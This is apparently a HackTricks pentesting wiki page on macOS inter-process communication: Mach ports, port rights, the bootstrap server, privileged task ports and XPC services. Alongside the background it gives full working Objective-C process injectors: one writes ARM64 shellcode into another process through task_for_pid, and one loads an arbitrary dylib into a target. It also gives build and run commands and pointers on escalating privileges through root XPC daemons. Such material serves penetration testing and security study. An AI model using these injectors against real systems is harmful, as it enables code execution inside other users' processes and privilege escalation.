# macOS IPC - Inter Process Communication

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mach messaging via Ports

Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.

Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act like **message queues** managed by the kernel.

Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are:

* **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
  * A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
* **Send right**, which allows sending messages to the port.
  * The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
* **Send-once right**, which allows sending one message to the port and then disappears.
* **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.

**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.

#### Steps:

As it's mentioned, in order to establish the communication channel, the **bootstrap server** (**launchd** in mac) is involved.

1. Task **A** initiates a **new port**, obtaining a **RECEIVE right** in the process.
2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
3. Task **A** establishes a **connection** with the **bootstrap server**, providing the **port's service name** and the **SEND right** through a procedure known as the bootstrap register.
4. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name. If successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
5. Upon acquiring a SEND right, Task **B** is capable of **formulating** a **message** and dispatching it **to Task A**.

The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.

Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.

For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:

* Task **B** initiates a bootstrap **lookup** for a service name.
* **launchd** checks if the task is running and if it isn’t, **starts** it.
* Task **A** (the service) performs a **bootstrap check-in**. Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
* launchd duplicates the **SEND right and sends it to Task B**.

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

### Code example

Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Create a new port.
    mach_port_t port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_allocate() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_allocate() created port right name %d\n", port);


    // Give us a send right to this port, in addition to the receive right.
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        printf("mach_port_insert_right() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("mach_port_insert_right() inserted a send right\n");


    // Send the send right to the bootstrap server, so that it can be looked up by other processes.
    kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_register() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_register()'ed our port\n");


    // Wait for a message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
        mach_msg_trailer_t trailer;
    } message;

    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_RCV_MSG,     // Options. We're receiving a message.
        0,                // Size of the message being sent, if sending.
        sizeof(message),  // Size of the buffer for receiving.
        port,             // The port to receive a message on.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Got a message\n");

    message.some_text[9] = 0;
    printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

    // Lookup the receiver port using the bootstrap server.
    mach_port_t port;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap_look_up() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("bootstrap_look_up() returned port right name %d\n", port);


    // Construct our message.
    struct {
        mach_msg_header_t header;
        char some_text[10];
        int some_number;
    } message;

    message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    message.header.msgh_remote_port = port;
    message.header.msgh_local_port = MACH_PORT_NULL;

    strncpy(message.some_text, "Hello", sizeof(message.some_text));
    message.some_number = 35;

    // Send the message.
    kr = mach_msg(
        &message.header,  // Same as (mach_msg_header_t *) &message.
        MACH_SEND_MSG,    // Options. We're sending a message.
        sizeof(message),  // Size of the message being sent.
        0,                // Size of the buffer for receiving.
        MACH_PORT_NULL,   // A port to receive a message on, if receiving.
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
    );
    if (kr != KERN_SUCCESS) {
        printf("mach_msg() failed with code 0x%x\n", kr);
        return 1;
    }
    printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Privileged Ports

* **Host port**: If a process has **Send** privilege over this port he can get **information** about the **system** (e.g. `host_processor_info`).
* **Host priv port**: A process with **Send** right over this port can perform **privileged actions** like loading a kernel extension. The **process need to be root** to get this permission.
  * Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
* **Task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.
* **Task port** (aka kernel port)**:** With Send permission over this port it's possible to control the task (read/write memory, create threads...).
  * Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) while doing a `fork()`.
  * These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
    * If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
    * Apps the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
    * **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

### Shellcode Injection in thread via Task port&#x20;

You can grab a shellcode from:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
    double result = 0;
    for (int i = 0; i < 10000; i++) {
        result += sqrt(i) * tan(i) - cos(i);
    }
    return result;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
        while (true) {
            [NSThread sleepForTimeInterval:5];

            performMathOperations();  // Silent action

            [NSThread sleepForTimeInterval:5];
        }
    }
    return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.get-task-allow</key>
    <true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compile** the previous program and add the **entitlements** to be able to inject code with the same user (if not you will need to use **sudo**).

<details>

<summary>sc_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

    task_t remoteTask;

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    

    // Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
	return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
	fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
	return (-4);
    }

    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}

pid_t pidForProcessName(NSString *processName) {
    NSArray *arguments = @[@"pgrep", processName];
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/usr/bin/env"];
    [task setArguments:arguments];

    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];

    NSData *data = [file readDataToEndOfFile];
    NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

    return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
    NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
    NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
    return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        if (argc < 2) {
            NSLog(@"Usage: %s <pid or process name>", argv[0]);
            return 1;
        }

        NSString *arg = [NSString stringWithUTF8String:argv[1]];
        pid_t pid;

        if (isStringNumeric(arg)) {
            pid = [arg intValue];
        } else {
            pid = pidForProcessName(arg);
            if (pid == 0) {
                NSLog(@"Error: Process named '%@' not found.", arg);
                return 1;
            }
            else{
                printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
            }
        }

        inject(pid);
    }

    return 0;
}
```

</details>

```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previos injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>

```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

    // "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

    // Call pthread_set_self

    "\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
    "\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
    "\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
    "\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the 
    "\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
    "\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
    "\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
    "\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
    "\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
    "\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
    "\x00\x00\x00\x14" // loop: b loop              ; loop forever

    // Call dlopen with the path to the library
    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
    
    // Call pthread_exit
    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
    
    "PTHRDCRT"  // <-
    "PTHRDEXT"  // <-
    "DLOPEN__"  // <- 
    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

    task_t remoteTask;
    struct stat buf;

    // Check if the library exists
    int rc = stat (lib, &buf);

    if (rc != 0)
    {
        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
        //return (-9);
    }

    // Get access to the task port of the process we want to inject into
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
        return (-1);
    }
    else{
        printf("Gathered privileges over the task port of process: %d\n", pid);
    }

    // Allocate memory for the stack
    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else
    {

        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    
    // Allocate memory for the code
    remoteCode64 = (vm_address_t) NULL;
    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }

 
    // Patch shellcode

    int i = 0;
    char *possiblePatchLocation = (injectedCode );
    for (i = 0 ; i < 0x100; i++)
    {

        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;

        
        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
        uint64_t addrOfDlopen = (uint64_t) dlopen;

        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
        }

        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
        {
            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
        }

        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
        {
            printf ("DLOpen @%llx\n", addrOfDlopen);
            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
        }

        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
        {
            strcpy(possiblePatchLocation, lib );
        }
    }

	// Write the shellcode to the allocated memory
    kr = mach_vm_write(remoteTask,                   // Task port
	                   remoteCode64,                 // Virtual Address (Destination)
	                   (vm_address_t) injectedCode,  // Source
	                    0xa9);                       // Length of the source


    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return (-3);
    }


    // Set the permissions on the allocated code memory
    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
        return (-4);
    }

    // Set the permissions on the allocated stack memory
    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
	
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
        return (-4);
    }


    // Create thread to run shellcode
    struct arm_unified_thread_state remoteThreadState64;
    thread_act_t         remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
        //remoteStack64 -= 8;  // need alignment of 16

    const char* p = (const char*) remoteCode64;

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

    if (kr != KERN_SUCCESS) {
        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
        return (-3);
    }

    return (0);
}



int main(int argc, const char * argv[])
{
    if (argc < 3)
	{
		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
		fprintf (stderr, "   _action_: path to a dylib on disk\n");
		exit(0);
	}

    pid_t pid = atoi(argv[1]);
    const char *action = argv[2];
    struct stat buf;

    int rc = stat (action, &buf);
    if (rc == 0) inject(pid,action);
    else
    {
        fprintf(stderr,"Dylib not found\n");
    }

}
```



</details>

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

XPC uses a form of Inter-Process Communication (IPC), which is a set of methods for different programs running on the same system to send data back and forth.

The primary benefits of XPC include:

1. **Security**: By separating work into different processes, each process can be granted only the permissions it needs. This means that even if a process is compromised, it has limited ability to do harm.
2. **Stability**: XPC helps isolate crashes to the component where they occur. If a process crashes, it can be restarted without affecting the rest of the system.
3. **Performance**: XPC allows for easy concurrency, as different tasks can be run simultaneously in different processes.

The only **drawback** is that **separating an application in several processes** making them communicate via XPC is **less efficient**. But in todays systems this isn't almost noticeable and the benefits are better.

### Application Specific XPC services

The XPC components of an application are **inside the application itself.** For example, in Safari you can find them in **`/Applications/Safari.app/Contents/XPCServices`**. They have extension **`.xpc`** (like **`com.apple.Safari.SandboxBroker.xpc`**) and are **also bundles** with the main binary inside of it: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker` and an `Info.plist: /Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/Info.plist`

As you might be thinking a **XPC component will have different entitlements and privileges** than the other XPC components or the main app binary. EXCEPT if a XPC service is configured with [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) set to “True” in its **Info.plist** file. In this case, the XPC service will run in the **same security session as the application** that called it.

XPC services are **started** by **launchd** when required and **shut down** once all tasks are **complete** to free system resources. **Application-specific XPC components can only be utilized by the application**, thereby reducing the risk associated with potential vulnerabilities.

### System Wide XPC services

System-wide XPC services are accessible to all users. These services, either launchd or Mach-type, need to be **defined in plist** files located in specified directories such as **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`**, or **`/Library/LaunchAgents`**.

These plists files will have a key called **`MachServices`** with the name of the service, and a key called **`Program`** with the path to the binary:

```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Program</key>
	<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
	<key>AbandonProcessGroup</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>Label</key>
	<string>com.jamf.management.daemon</string>
	<key>MachServices</key>
	<dict>
		<key>com.jamf.management.daemon.aad</key>
		<true/>
		<key>com.jamf.management.daemon.agent</key>
		<true/>
		<key>com.jamf.management.daemon.binary</key>
		<true/>
		<key>com.jamf.management.daemon.selfservice</key>
		<true/>
		<key>com.jamf.management.daemon.service</key>
		<true/>
	</dict>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
```

The ones in **`LaunchDameons`** are run by root. So if an unprivileged process can talk with one of these it could be able to escalate privileges.

### XPC Event Messages

